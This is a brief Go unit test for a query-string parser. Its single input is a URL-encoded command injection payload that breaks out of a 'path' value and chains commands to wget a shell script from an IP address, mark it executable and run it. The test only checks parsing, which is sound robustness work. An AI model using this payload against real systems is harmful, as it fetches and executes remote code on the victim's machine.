package util

import "testing"

func TestCustomParseQuery(t *testing.T) {

	res, err := CustomParseQuery("path=%22;cd%20%2Fvar%3Bwget%20http%3A%2F%2F45.128.232.229%2Fcgi-dns.sh%3Bchmod%20%2Bx%20cgi-dns.sh%3Bsh%20cgi-dns.sh%22")

	if err != nil {
		t.Errorf("got unexpected error %v", err)
	}

	if len(res) != 1 {
		t.Errorf("expected 1 result, got %d", len(res))
	}
}
